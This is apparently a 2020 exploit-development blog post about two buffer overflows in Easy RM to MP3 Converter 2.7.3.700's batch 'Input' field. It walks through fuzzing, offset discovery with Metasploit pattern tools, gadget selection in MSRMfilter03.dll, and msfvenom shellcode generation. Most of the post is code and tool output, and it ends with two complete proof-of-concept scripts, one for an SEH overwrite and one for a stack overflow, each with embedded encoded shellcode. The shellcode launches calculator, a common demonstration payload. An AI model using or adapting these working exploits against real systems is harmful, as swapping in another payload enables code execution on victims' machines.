---
layout: post
title: Easy RM to MP3 Converter 2.7.3.700 - 'Input' Buffer Overflows
date: 2020-03-26 16:05:00
categories: posts
comments: false
en: true
---

# Preamble
After finishing with the [previous](https://whitecr0wz.github.io/posts/Easy-RM-to-MP3-Converter/) vulnerability, i was eager to find out if i could exploit another vulnerable function within this program, which brought us to this post.

# The Bug

Easy RM to MP3 Converter 2.7.3.700 suffers from a vulerability in which it is possible to trigger a Buffer Overflow or a Structured Exception Handling Overwrite when specifying a long string within the parameter "Input" in the "Batch" section.

A small fuzzing script is generated:

```term_session
import struct

buffer = "A" * 50000

f = open ("finding3.txt", "w")
f.write(buffer)
f.close()
```

After this script is run, its contents are copied into the clipboard with Notepad++:

![](/assets/img/Findings3/0.png)

Once this is copied and the application is started, select "Cancel":

![](/assets/img/Findings3/1.png)

The section "Batch" is chosen:

![](/assets/img/Findings3/2.png)

In the parameter "Input", delete everything and paste the contents of the generated file:

![](/assets/img/Findings3/3.png)

![](/assets/img/Findings3/4.png)

A message box may appear, click OK:

![](/assets/img/Findings3/5.png)

Once this is done, the SEH Chain is overwritten:

![](/assets/img/Findings3/6.png)

A pattern is generated:

```term_session
root@kali:~# msf-pattern_create -l 50000 > pattern 
root@kali:~# 
```

After the process is repeated (changing the A's for the pattern), the SEH Chain is overwritten by the pattern:

![](/assets/img/Findings3/7.png)

The nSEH value is copied and the offset is found using msf-pattern_offset:

```term_session
root@kali:~# msf-pattern_offset -q 336F4C32 -l 50000 
[*] Exact match at offset 9008
[*] Exact match at offset 29288
[*] Exact match at offset 49568
root@kali:~#
```

## Hijacking the power

Updated PoC:

```term_session
import struct

buffer = "A" * 9008 + "BBBB" + "CCCC"

f = open ("finding3.txt", "w")
f.write(buffer)
f.close()
```

When the aforementioned process is yet repeated, an additional messagebox appears, just click OK:

![](/assets/img/Findings3/8.png)

The SEH Chain is overwritten as desired:

![](/assets/img/Findings3/9.png)

The next step is to find a reliable POP-POP-RETN sequence. 

Listing the modules:

![](/assets/img/Findings3/11.png)

In this case, i chose the module MSRMfilter03.dll, as it has all protections disabled and does not contain a NULL-byte within its base address.

Listing POP-POP-RETN sequences:

![](/assets/img/Findings3/12.png)

The first address was chosen and inserted into the script.

Updated PoC:

```term_session
import struct

nseh = struct.pack("<I", 0x06710870)
seh = struct.pack("<I", 0x10025A2E) # 0x10025a2e : pop ecx # pop esi # ret  | ascii {PAGE_EXECUTE_READ} [MSRMfilter03.dll] ASLR: False, 
Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Easy RM to MP3 Converter\MSRMfilter03.dll)

buffer = "A" * 9008 + nseh + seh + "\xff" * 200

f = open ("finding3.txt", "w")
f.write(buffer)
f.close()
```
Succeeding the crash, SHIFT+F9 is pressed, granting execution:

![](/assets/img/Findings3/13.png)

## Shellcode

Some shellcode that spawns calculator is generated:

```term_session
root@kali:~# msfvenom -p windows/exec CMD=calc.exe -f py -e x86/alpha_mixed EXITFUNC=thread 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/alpha_mixed
x86/alpha_mixed succeeded with size 448 (iteration=0)
x86/alpha_mixed chosen with final size 448
Payload size: 448 bytes
Final size of py file: 2188 bytes
buf =  b""
buf += b"\x89\xe1\xdb\xc4\xd9\x71\xf4\x5e\x56\x59\x49\x49\x49"
buf += b"\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43"
buf += b"\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41"
buf += b"\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
buf += b"\x58\x50\x38\x41\x42\x75\x4a\x49\x59\x6c\x68\x68\x6b"
buf += b"\x32\x35\x50\x43\x30\x35\x50\x73\x50\x4b\x39\x78\x65"
buf += b"\x76\x51\x79\x50\x32\x44\x4e\x6b\x52\x70\x36\x50\x6e"
buf += b"\x6b\x71\x42\x44\x4c\x4e\x6b\x31\x42\x44\x54\x4e\x6b"
buf += b"\x73\x42\x35\x78\x54\x4f\x6e\x57\x52\x6a\x74\x66\x46"
buf += b"\x51\x4b\x4f\x4c\x6c\x67\x4c\x50\x61\x73\x4c\x75\x52"
buf += b"\x64\x6c\x55\x70\x69\x51\x7a\x6f\x66\x6d\x76\x61\x7a"
buf += b"\x67\x59\x72\x5a\x52\x42\x72\x53\x67\x4e\x6b\x63\x62"
buf += b"\x42\x30\x6e\x6b\x73\x7a\x45\x6c\x6c\x4b\x42\x6c\x46"
buf += b"\x71\x33\x48\x4d\x33\x51\x58\x63\x31\x5a\x71\x42\x71"
buf += b"\x6e\x6b\x42\x79\x67\x50\x33\x31\x68\x53\x4c\x4b\x53"
buf += b"\x79\x65\x48\x49\x73\x37\x4a\x32\x69\x4e\x6b\x46\x54"
buf += b"\x4c\x4b\x47\x71\x7a\x76\x34\x71\x59\x6f\x4c\x6c\x4b"
buf += b"\x71\x5a\x6f\x54\x4d\x43\x31\x6b\x77\x36\x58\x59\x70"
buf += b"\x70\x75\x68\x76\x66\x63\x71\x6d\x6b\x48\x37\x4b\x51"
buf += b"\x6d\x74\x64\x71\x65\x4b\x54\x31\x48\x6c\x4b\x61\x48"
buf += b"\x45\x74\x73\x31\x6a\x73\x31\x76\x4e\x6b\x66\x6c\x52"
buf += b"\x6b\x4c\x4b\x53\x68\x45\x4c\x63\x31\x7a\x73\x4c\x4b"
buf += b"\x74\x44\x6c\x4b\x65\x51\x78\x50\x4e\x69\x71\x54\x34"
buf += b"\x64\x51\x34\x63\x6b\x33\x6b\x31\x71\x42\x79\x50\x5a"
buf += b"\x36\x31\x4b\x4f\x49\x70\x51\x4f\x31\x4f\x53\x6a\x6c"
buf += b"\x4b\x56\x72\x38\x6b\x6c\x4d\x71\x4d\x61\x7a\x33\x31"
buf += b"\x4c\x4d\x6b\x35\x6e\x52\x57\x70\x77\x70\x75\x50\x66"
buf += b"\x30\x73\x58\x45\x61\x6c\x4b\x62\x4f\x6b\x37\x4b\x4f"
buf += b"\x48\x55\x4f\x4b\x49\x70\x55\x4d\x55\x7a\x47\x7a\x32"
buf += b"\x48\x6e\x46\x6e\x75\x6d\x6d\x6d\x4d\x49\x6f\x38\x55"
buf += b"\x67\x4c\x57\x76\x53\x4c\x66\x6a\x4d\x50\x6b\x4b\x69"
buf += b"\x70\x30\x75\x55\x55\x6f\x4b\x70\x47\x67\x63\x44\x32"
buf += b"\x70\x6f\x30\x6a\x37\x70\x71\x43\x79\x6f\x4e\x35\x42"
buf += b"\x43\x43\x51\x70\x6c\x33\x53\x46\x4e\x43\x55\x61\x68"
buf += b"\x75\x35\x75\x50\x41\x41"
root@kali:~# 
```

# EndGame

![](/assets/img/Findings3/14.png)

Final PoC: 

```term_session
import struct

# msfvenom -p windows/exec CMD=calc.exe -f py -e x86/alpha_mixed EXITFUNC=thread 
# Payload size: 448 bytes

buf =  b""
buf += b"\x89\xe1\xdb\xc4\xd9\x71\xf4\x5e\x56\x59\x49\x49\x49"
buf += b"\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43"
buf += b"\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41"
buf += b"\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
buf += b"\x58\x50\x38\x41\x42\x75\x4a\x49\x59\x6c\x68\x68\x6b"
buf += b"\x32\x35\x50\x43\x30\x35\x50\x73\x50\x4b\x39\x78\x65"
buf += b"\x76\x51\x79\x50\x32\x44\x4e\x6b\x52\x70\x36\x50\x6e"
buf += b"\x6b\x71\x42\x44\x4c\x4e\x6b\x31\x42\x44\x54\x4e\x6b"
buf += b"\x73\x42\x35\x78\x54\x4f\x6e\x57\x52\x6a\x74\x66\x46"
buf += b"\x51\x4b\x4f\x4c\x6c\x67\x4c\x50\x61\x73\x4c\x75\x52"
buf += b"\x64\x6c\x55\x70\x69\x51\x7a\x6f\x66\x6d\x76\x61\x7a"
buf += b"\x67\x59\x72\x5a\x52\x42\x72\x53\x67\x4e\x6b\x63\x62"
buf += b"\x42\x30\x6e\x6b\x73\x7a\x45\x6c\x6c\x4b\x42\x6c\x46"
buf += b"\x71\x33\x48\x4d\x33\x51\x58\x63\x31\x5a\x71\x42\x71"
buf += b"\x6e\x6b\x42\x79\x67\x50\x33\x31\x68\x53\x4c\x4b\x53"
buf += b"\x79\x65\x48\x49\x73\x37\x4a\x32\x69\x4e\x6b\x46\x54"
buf += b"\x4c\x4b\x47\x71\x7a\x76\x34\x71\x59\x6f\x4c\x6c\x4b"
buf += b"\x71\x5a\x6f\x54\x4d\x43\x31\x6b\x77\x36\x58\x59\x70"
buf += b"\x70\x75\x68\x76\x66\x63\x71\x6d\x6b\x48\x37\x4b\x51"
buf += b"\x6d\x74\x64\x71\x65\x4b\x54\x31\x48\x6c\x4b\x61\x48"
buf += b"\x45\x74\x73\x31\x6a\x73\x31\x76\x4e\x6b\x66\x6c\x52"
buf += b"\x6b\x4c\x4b\x53\x68\x45\x4c\x63\x31\x7a\x73\x4c\x4b"
buf += b"\x74\x44\x6c\x4b\x65\x51\x78\x50\x4e\x69\x71\x54\x34"
buf += b"\x64\x51\x34\x63\x6b\x33\x6b\x31\x71\x42\x79\x50\x5a"
buf += b"\x36\x31\x4b\x4f\x49\x70\x51\x4f\x31\x4f\x53\x6a\x6c"
buf += b"\x4b\x56\x72\x38\x6b\x6c\x4d\x71\x4d\x61\x7a\x33\x31"
buf += b"\x4c\x4d\x6b\x35\x6e\x52\x57\x70\x77\x70\x75\x50\x66"
buf += b"\x30\x73\x58\x45\x61\x6c\x4b\x62\x4f\x6b\x37\x4b\x4f"
buf += b"\x48\x55\x4f\x4b\x49\x70\x55\x4d\x55\x7a\x47\x7a\x32"
buf += b"\x48\x6e\x46\x6e\x75\x6d\x6d\x6d\x4d\x49\x6f\x38\x55"
buf += b"\x67\x4c\x57\x76\x53\x4c\x66\x6a\x4d\x50\x6b\x4b\x69"
buf += b"\x70\x30\x75\x55\x55\x6f\x4b\x70\x47\x67\x63\x44\x32"
buf += b"\x70\x6f\x30\x6a\x37\x70\x71\x43\x79\x6f\x4e\x35\x42"
buf += b"\x43\x43\x51\x70\x6c\x33\x53\x46\x4e\x43\x55\x61\x68"
buf += b"\x75\x35\x75\x50\x41\x41" 

nseh = struct.pack("<I", 0x06710870)
seh = struct.pack("<I", 0x10025A2E) # 0x10025a2e : pop ecx # pop esi # ret  | ascii {PAGE_EXECUTE_READ} [MSRMfilter03.dll] ASLR: False, 
Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Easy RM to MP3 Converter\MSRMfilter03.dll)

buffer = "A" * 9008 + nseh + seh + "\x41\x49" * 10 + buf + "\xff" * 200

f = open ("finding3.txt", "w")
f.write(buffer)
f.close()
```

# Second Stage

After exploiting this application i thought of exploiting a Vanilla Stack Overflow, as the EIP would get overwritten when performing the SEH exploitation:

![](/assets/img/Findings3/10.png)

As it is already known that it crashes with 9000 bytes, let's create a pattern with such length:

```term_session
root@kali:~# msf-pattern_create -l 9000 > pattern 
root@kali:~# 
```

Following the exploitation, the EIP is overwritten by the pattern:

![](/assets/img/Findings4/0.png)

The offset is found with the use of msf-pattern_offset:

```term_session
root@kali:~# msf-pattern_offset -q 654C3165 -l 9000 
[*] Exact match at offset 8704
root@kali:~# 
```

Now it is needed to verify whether the control has been achieved or not.

Updated PoC:

```term_session
import struct

buffer = "A" * 8704 + "BBBB" + "\xff" * 200 

f = open ("finding4.txt", "w")
f.write(buffer)
f.close()
```

The process is yet repeated verifying control:

![](/assets/img/Findings4/2.png)

## Hijacking the power

In a Vanilla Buffer Overflow it is needed to use an instruction which will align ESP with EIP, in the majority of the cases being a JMP ESP, or in some cases a CALL ESP. However, in this case none of them were found in the MSRMfilter03.dll module. Despite this obstacle, i was capable of finding a PUSH ESP, RET instruction, which will have the same function as the others:

![](/assets/img/Findings4/3.png)

Updated PoC:

```term_session
import struct

pushesp = struct.pack("<I", 0x1001B058) # 0x1001b058 : "\x54\xC3" |  {PAGE_EXECUTE_READ} [MSRMfilter03.dll] ASLR: False, Rebase: False, 
SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Easy RM to MP3 Converter\MSRMfilter03.dll)

buffer = "A" * 8704 + pushesp + "\xff" * 200 

f = open ("finding4.txt", "w")
f.write(buffer)
f.close()
```

Succeeding the exploitation, the additional bytes are executed:

![](/assets/img/Findings4/4.png)

# Shellcode

The last step is to generate some shellcode:

```term_session
root@kali:~# msfvenom -p windows/exec CMD=calc.exe -f py -e x86/alpha_mixed BufferRegister=ESP EXITFUNC=thread 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/alpha_mixed
x86/alpha_mixed succeeded with size 440 (iteration=0)
x86/alpha_mixed chosen with final size 440
Payload size: 440 bytes
Final size of py file: 2145 bytes
buf =  b""
buf += b"\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
buf += b"\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
buf += b"\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
buf += b"\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
buf += b"\x59\x6c\x49\x78\x4f\x72\x77\x70\x45\x50\x77\x70\x73"
buf += b"\x50\x6c\x49\x58\x65\x34\x71\x39\x50\x51\x74\x6e\x6b"
buf += b"\x30\x50\x76\x50\x6e\x6b\x66\x32\x64\x4c\x4e\x6b\x52"
buf += b"\x72\x37\x64\x4e\x6b\x51\x62\x67\x58\x36\x6f\x4f\x47"
buf += b"\x61\x5a\x64\x66\x36\x51\x69\x6f\x4c\x6c\x55\x6c\x31"
buf += b"\x71\x51\x6c\x37\x72\x34\x6c\x75\x70\x59\x51\x68\x4f"
buf += b"\x56\x6d\x76\x61\x78\x47\x59\x72\x5a\x52\x56\x32\x51"
buf += b"\x47\x6c\x4b\x76\x32\x64\x50\x6e\x6b\x61\x5a\x47\x4c"
buf += b"\x4e\x6b\x52\x6c\x57\x61\x52\x58\x6d\x33\x70\x48\x63"
buf += b"\x31\x4a\x71\x73\x61\x4c\x4b\x66\x39\x55\x70\x77\x71"
buf += b"\x58\x53\x4e\x6b\x62\x69\x45\x48\x49\x73\x74\x7a\x42"
buf += b"\x69\x6e\x6b\x76\x54\x6c\x4b\x45\x51\x78\x56\x35\x61"
buf += b"\x49\x6f\x4e\x4c\x59\x51\x78\x4f\x76\x6d\x65\x51\x39"
buf += b"\x57\x65\x68\x4d\x30\x31\x65\x69\x66\x76\x63\x31\x6d"
buf += b"\x4a\x58\x37\x4b\x31\x6d\x54\x64\x54\x35\x79\x74\x52"
buf += b"\x78\x4e\x6b\x33\x68\x44\x64\x56\x61\x38\x53\x50\x66"
buf += b"\x6e\x6b\x74\x4c\x52\x6b\x6e\x6b\x32\x78\x77\x6c\x73"
buf += b"\x31\x4b\x63\x4c\x4b\x67\x74\x4e\x6b\x63\x31\x6e\x30"
buf += b"\x4e\x69\x77\x34\x36\x44\x64\x64\x71\x4b\x63\x6b\x51"
buf += b"\x71\x66\x39\x31\x4a\x36\x31\x39\x6f\x59\x70\x43\x6f"
buf += b"\x43\x6f\x62\x7a\x6c\x4b\x55\x42\x38\x6b\x6e\x6d\x43"
buf += b"\x6d\x42\x4a\x53\x31\x4c\x4d\x6d\x55\x6c\x72\x67\x70"
buf += b"\x33\x30\x77\x70\x50\x50\x53\x58\x75\x61\x4c\x4b\x30"
buf += b"\x6f\x6b\x37\x49\x6f\x78\x55\x6f\x4b\x69\x70\x57\x6d"
buf += b"\x45\x7a\x37\x7a\x53\x58\x4e\x46\x5a\x35\x4d\x6d\x6f"
buf += b"\x6d\x59\x6f\x39\x45\x47\x4c\x36\x66\x51\x6c\x45\x5a"
buf += b"\x4d\x50\x39\x6b\x39\x70\x50\x75\x55\x55\x4f\x4b\x70"
buf += b"\x47\x46\x73\x64\x32\x62\x4f\x72\x4a\x65\x50\x71\x43"
buf += b"\x69\x6f\x4e\x35\x53\x53\x30\x61\x42\x4c\x75\x33\x76"
buf += b"\x4e\x75\x35\x61\x68\x61\x75\x37\x70\x41\x41"
root@kali:~# 
```

# EndGame

![](/assets/img/Findings4/5.png)

Final PoC:

```term_session
import struct

# msfvenom -p windows/exec CMD=calc.exe -f py -e x86/alpha_mixed BufferRegister=ESP EXITFUNC=thread 
# Payload size: 440 bytes

buf =  b""
buf += b"\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
buf += b"\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
buf += b"\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
buf += b"\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
buf += b"\x59\x6c\x49\x78\x4f\x72\x77\x70\x45\x50\x77\x70\x73"
buf += b"\x50\x6c\x49\x58\x65\x34\x71\x39\x50\x51\x74\x6e\x6b"
buf += b"\x30\x50\x76\x50\x6e\x6b\x66\x32\x64\x4c\x4e\x6b\x52"
buf += b"\x72\x37\x64\x4e\x6b\x51\x62\x67\x58\x36\x6f\x4f\x47"
buf += b"\x61\x5a\x64\x66\x36\x51\x69\x6f\x4c\x6c\x55\x6c\x31"
buf += b"\x71\x51\x6c\x37\x72\x34\x6c\x75\x70\x59\x51\x68\x4f"
buf += b"\x56\x6d\x76\x61\x78\x47\x59\x72\x5a\x52\x56\x32\x51"
buf += b"\x47\x6c\x4b\x76\x32\x64\x50\x6e\x6b\x61\x5a\x47\x4c"
buf += b"\x4e\x6b\x52\x6c\x57\x61\x52\x58\x6d\x33\x70\x48\x63"
buf += b"\x31\x4a\x71\x73\x61\x4c\x4b\x66\x39\x55\x70\x77\x71"
buf += b"\x58\x53\x4e\x6b\x62\x69\x45\x48\x49\x73\x74\x7a\x42"
buf += b"\x69\x6e\x6b\x76\x54\x6c\x4b\x45\x51\x78\x56\x35\x61"
buf += b"\x49\x6f\x4e\x4c\x59\x51\x78\x4f\x76\x6d\x65\x51\x39"
buf += b"\x57\x65\x68\x4d\x30\x31\x65\x69\x66\x76\x63\x31\x6d"
buf += b"\x4a\x58\x37\x4b\x31\x6d\x54\x64\x54\x35\x79\x74\x52"
buf += b"\x78\x4e\x6b\x33\x68\x44\x64\x56\x61\x38\x53\x50\x66"
buf += b"\x6e\x6b\x74\x4c\x52\x6b\x6e\x6b\x32\x78\x77\x6c\x73"
buf += b"\x31\x4b\x63\x4c\x4b\x67\x74\x4e\x6b\x63\x31\x6e\x30"
buf += b"\x4e\x69\x77\x34\x36\x44\x64\x64\x71\x4b\x63\x6b\x51"
buf += b"\x71\x66\x39\x31\x4a\x36\x31\x39\x6f\x59\x70\x43\x6f"
buf += b"\x43\x6f\x62\x7a\x6c\x4b\x55\x42\x38\x6b\x6e\x6d\x43"
buf += b"\x6d\x42\x4a\x53\x31\x4c\x4d\x6d\x55\x6c\x72\x67\x70"
buf += b"\x33\x30\x77\x70\x50\x50\x53\x58\x75\x61\x4c\x4b\x30"
buf += b"\x6f\x6b\x37\x49\x6f\x78\x55\x6f\x4b\x69\x70\x57\x6d"
buf += b"\x45\x7a\x37\x7a\x53\x58\x4e\x46\x5a\x35\x4d\x6d\x6f"
buf += b"\x6d\x59\x6f\x39\x45\x47\x4c\x36\x66\x51\x6c\x45\x5a"
buf += b"\x4d\x50\x39\x6b\x39\x70\x50\x75\x55\x55\x4f\x4b\x70"
buf += b"\x47\x46\x73\x64\x32\x62\x4f\x72\x4a\x65\x50\x71\x43"
buf += b"\x69\x6f\x4e\x35\x53\x53\x30\x61\x42\x4c\x75\x33\x76"
buf += b"\x4e\x75\x35\x61\x68\x61\x75\x37\x70\x41\x41"

pushesp = struct.pack("<I", 0x1001B058) # 0x1001b058 : "\x54\xC3" |  {PAGE_EXECUTE_READ} [MSRMfilter03.dll] ASLR: False, Rebase: False, 
SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Easy RM to MP3 Converter\MSRMfilter03.dll)

buffer = "A" * 8704 + pushesp + buf + "\xff" * 200 

f = open ("finding4.txt", "w")
f.write(buffer)
f.close()
```